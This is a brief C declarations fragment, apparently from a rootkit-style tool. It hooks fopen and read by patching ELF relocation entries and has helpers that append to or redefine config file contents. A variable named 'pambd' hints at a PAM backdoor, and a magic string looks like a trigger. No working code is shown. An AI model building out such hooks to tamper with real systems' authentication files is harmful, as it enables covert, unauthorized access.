FILE *my_fopen(char *filename, char *mode);
ssize_t new_read(int fd, void *buf, size_t count);

FILE *(*ref_fopen)(char*, char*);
ssize_t (*ref_read)(int fd, void *buf, size_t count);

Elf64_Rela *ref_fopen_Rela;
Elf64_Rela *ref_read_Rela;

int ref_read_type;

int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append);
int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, char **buf, int *_buf_len);


enum worktype {
	APPEND,
	EXPLICIT,
	NOWORK
};

int pambd;

char magicstr[25];
unsigned int magiclen;
unsigned int magiccnt;

#define RELOC_ADDEND 1
#define RELOC_INFO 2
#define RELOC_OFFSET 3
